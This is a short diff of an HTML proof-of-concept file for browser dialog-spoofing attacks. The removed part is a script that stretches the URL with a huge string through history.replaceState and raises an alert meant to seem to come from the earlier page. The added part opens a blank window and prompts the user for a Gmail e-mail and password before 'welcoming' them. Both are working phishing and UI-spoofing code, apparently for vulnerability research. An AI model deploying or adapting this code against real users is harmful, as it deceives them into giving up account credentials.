@@ -1,9 +1,9 @@
-<script>
-a="aaaaaaaaaaaaaaaa";
-for (i = 0; i < 19; i++) { 
-a += a;
-}
-history.replaceState("example", "example", a);
-alert("This alert will be shown as 'From this page', while still rendering the page the link was clicked from");
-</script>
-The attack page goes here
+
+<script> function go(){ 
+ var x=window.open('about:blank'); 
+ setTimeout(function(){
+ a=x.alert('Go to gmail.com');x.prompt('E-mail','');b=x.prompt('Password','');x.alert('Welcome to Gmail.com');} ,1000);
+  } 
+ </script> 
+ 
+ <button onclick="go()">go</button>
